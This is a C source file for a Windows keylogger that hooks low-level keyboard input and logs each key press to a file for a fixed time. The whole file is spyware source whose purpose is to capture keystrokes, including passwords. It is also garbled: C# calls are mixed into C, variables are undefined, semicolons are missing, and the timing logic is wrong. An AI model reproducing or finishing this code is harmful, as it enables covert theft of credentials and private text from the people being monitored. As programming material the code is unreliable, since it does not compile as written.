#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <winuser.h>

FILE *outputFile;

void log(char s1[]) {
  FILE *file = fopen("Filename", "a+");

  static int i = 0;
  fputs(s1, file);
  i++;
  if (i == 50) {
    fputc('\n', file);
    i = 0;
  }
  fclose(file);
}

void writeToFile(DWORD code) {
  char val[100];
  sprintf(val, "%c", code);

  fputs(val, outputFile);
}

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM messageIdentifier,
                                      LPARAM hookStruct) {
  // LowLevelKeyboardProc is called by the system on a new keyboard input event
  KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

  if (messageIdentifier == WM_KEYDOWN) {
    DWORD vCode = pKeyBoard->vkCode;
    writeToFile(vCode);
  }

  return CallNextHookEx(
      NULL, code, messageIdentifier,
      hookStruct); // I think it just lets the original program continue running
}

HHOOK setHook() {
  Process curProcess = Process.GetCurrentProcess();
  ProcessModule curModule = curProcess.MainModule;

  return SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc,
                          GetModuleHandle(curModule.ModuleName), 0)
  /*
   MSG msg;

   while (GetMessage(&msg, NULL, 0, 0) != 0)
     msg = 0;

   UnhookWindowsHookEx(hKeyHook);
   */
}

void keyloggerMain() {
  clock_t start = clock();
  clock_t duration = (clock() - clock()) / CLOCKS_PER_SEC;
  MSG msg;
  FILE *file = fopen("keylogs", "a+");

  HHOOK hKeyHook = setHook();

  GetMessage(&msg, NULL, 0, 0);

  while (duration < 15) {
    duration = (clock() - start) / CLOCKS_PER_SEC;
  }

  UnhookWindowsHookEx(hKeyHook);
  fclose(file);
}

int main(void) { keyloggerMain() return 0; }
